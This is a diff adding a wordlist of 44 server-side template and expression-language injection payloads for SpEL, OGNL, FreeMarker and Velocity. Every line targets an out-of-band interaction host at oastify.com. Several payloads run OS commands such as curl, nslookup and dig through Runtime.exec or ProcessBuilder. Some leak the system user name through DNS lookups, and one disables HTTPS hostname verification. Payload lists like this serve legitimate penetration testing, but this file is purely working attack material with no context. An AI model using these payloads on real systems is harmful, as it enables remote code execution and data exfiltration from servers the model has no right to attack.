@@ -1,0 +1,44 @@
+%%${T(java.net.URL).new('http://7ksu4ugmxlc9tco22ihkciufh6nxbogc5.oastify.com/')}%%
+%%${''.class.forName('java.net.URL').getConstructor(''.class).newInstance('http://7ksu4ugmxlc9tco22ihkciufh6nxbogc5.oastify.com/')}%%
+%%${new java.net.URL('http://7ksu4ugmxlc9tco22ihkciufh6nxbogc5.oastify.com/').openConnection()}%%
+%%${T(java.net.InetAddress).getByName('7ksu4ugmxlc9tco22ihkciufh6nxbogc5.oastify.com')}%%
+%%${java.net.InetAddress.getByName('7ksu4ugmxlc9tco22ihkciufh6nxbogc5.oastify.com')}%%
+%%${T(java.net.InetAddress).getByName('test.7ksu4ugmxlc9tco22ihkciufh6nxbogc5.oastify.com')}%%
+%%${T(java.net.InetAddress).getAllByName('test.7ksu4ugmxlc9tco22ihkciufh6nxbogc5.oastify.com')}%%
+%%${T(java.net.InetAddress).getCanonicalHostName('7ksu4ugmxlc9tco22ihkciufh6nxbogc5.oastify.com')}%%
+%%${''.class.forName('java.net.InetAddress').getMethod('getByName',''.class).invoke(null,'7ksu4ugmxlc9tco22ihkciufh6nxbogc5.oastify.com')}%%
+%%${@java.net.InetAddress@getByName('7ksu4ugmxlc9tco22ihkciufh6nxbogc5.oastify.com')}%%
+%%${new java.net.URL('http://7ksu4ugmxlc9tco22ihkciufh6nxbogc5.oastify.com/').openStream()}%%
+%%${T(java.net.URL).new('http://7ksu4ugmxlc9tco22ihkciufh6nxbogc5.oastify.com/').getContent()}%%
+%%${#a=new java.net.URL('http://7ksu4ugmxlc9tco22ihkciufh6nxbogc5.oastify.com/').openConnection(),#a.connect()}%%
+%%@java.net.InetAddress@getByName('7ksu4ugmxlc9tco22ihkciufh6nxbogc5.oastify.com')%%
+%%#a=@java.net.URL@new('http://7ksu4ugmxlc9tco22ihkciufh6nxbogc5.oastify.com/'),#a.openStream()%%
+%%@java.net.URL@new('http://7ksu4ugmxlc9tco22ihkciufh6nxbogc5.oastify.com/').openConnection().connect()%%
+%%${T(java.lang.Runtime).getRuntime().exec('nslookup 7ksu4ugmxlc9tco22ihkciufh6nxbogc5.oastify.com')}%%
+%%${T(java.lang.Runtime).getRuntime().exec('ping -c 1 7ksu4ugmxlc9tco22ihkciufh6nxbogc5.oastify.com')}%%
+%%${T(java.lang.Runtime).getRuntime().exec('curl http://7ksu4ugmxlc9tco22ihkciufh6nxbogc5.oastify.com/')}%%
+%%${new ProcessBuilder('nslookup','7ksu4ugmxlc9tco22ihkciufh6nxbogc5.oastify.com').start()}%%
+%%${T(java.net.URI).create('http://7ksu4ugmxlc9tco22ihkciufh6nxbogc5.oastify.com/')}%%
+%%${new java.net.URI('http://7ksu4ugmxlc9tco22ihkciufh6nxbogc5.oastify.com/').toURL().openConnection()}%%
+%%${T(java.net.URI).new('http://7ksu4ugmxlc9tco22ihkciufh6nxbogc5.oastify.com/').toURL()}%%
+%%${T(java.net.URL).new('http://7ksu4ugmxlc9tco22ihkciufh6nxbogc5.oastify.com/').openConnection().connect()}%%
+%%${T(javax.net.ssl.HttpsURLConnection).setDefaultHostnameVerifier(null)}%%
+%%${T(java.lang.Runtime).getRuntime().exec(new String[]{'sh','-c','host 7ksu4ugmxlc9tco22ihkciufh6nxbogc5.oastify.com'})}%%
+%%${T(java.lang.Runtime).getRuntime().exec(['dig','7ksu4ugmxlc9tco22ihkciufh6nxbogc5.oastify.com'])}%%
+%%${T(java.lang.Runtime).getRuntime().exec('getent hosts 7ksu4ugmxlc9tco22ihkciufh6nxbogc5.oastify.com')}%%
+%%${T(javax.naming.InitialContext).new().lookup('dns:7ksu4ugmxlc9tco22ihkciufh6nxbogc5.oastify.com')}%%
+%%${T(java.net.NetworkInterface).getByName('7ksu4ugmxlc9tco22ihkciufh6nxbogc5.oastify.com')}%%
+%%${new javax.naming.directory.InitialDirContext().getAttributes('dns://7ksu4ugmxlc9tco22ihkciufh6nxbogc5.oastify.com')}%%
+%%${"freemarker.template.utility.Execute"?new()("curl http://7ksu4ugmxlc9tco22ihkciufh6nxbogc5.oastify.com/")}%%
+%%${.get_optional_template("http://7ksu4ugmxlc9tco22ihkciufh6nxbogc5.oastify.com/template.ftl")}%%
+%%#set($url=$class.inspect("java.net.URL").type.getConstructor($class.inspect("java.lang.String").type).newInstance("http://7ksu4ugmxlc9tco22ihkciufh6nxbogc5.oastify.com/"))%%
+%%$class.inspect("java.net.InetAddress").type.getMethod("getByName",$class.inspect("java.lang.String").type).invoke(null,"7ksu4ugmxlc9tco22ihkciufh6nxbogc5.oastify.com")%%
+%%${T(java.net.InetAddress).getByName(T(java.lang.System).getProperty('user.name').concat('.7ksu4ugmxlc9tco22ihkciufh6nxbogc5.oastify.com'))}%%
+%%${T(java.net.URL).new('http://'.concat(T(java.lang.System).getProperty('user.name')).concat('.7ksu4ugmxlc9tco22ihkciufh6nxbogc5.oastify.com/'))}%%
+%%${T(java.net.InetAddress).getByName('test'.concat(T(java.lang.Math).random()).concat('.7ksu4ugmxlc9tco22ihkciufh6nxbogc5.oastify.com'))}%%
+%%${T(java.net.InetAddress).getByName('coll'+'aborator'+'.host')}%%
+%%${T(java.net.InetAddress).getByName(new java.lang.String('7ksu4ugmxlc9tco22ihkciufh6nxbogc5.oastify.com'))}%%
+%%${T(java.net.InetAddress).getByName(T(java.lang.String).new('7ksu4ugmxlc9tco22ihkciufh6nxbogc5.oastify.com'))}%%
+%%${T(java.net.URL).new(T(java.lang.String).new('http://7ksu4ugmxlc9tco22ihkciufh6nxbogc5.oastify.com/'))}%%
+%%${T(java.lang.Thread).currentThread().getContextClassLoader().loadClass('java.net.URL').newInstance('http://7ksu4ugmxlc9tco22ihkciufh6nxbogc5.oastify.com/')}%%
+%%${this.getClass().getClassLoader().loadClass('java.net.InetAddress').getMethod('getByName',T(java.lang.String)).invoke(null,'7ksu4ugmxlc9tco22ihkciufh6nxbogc5.oastify.com')}%%
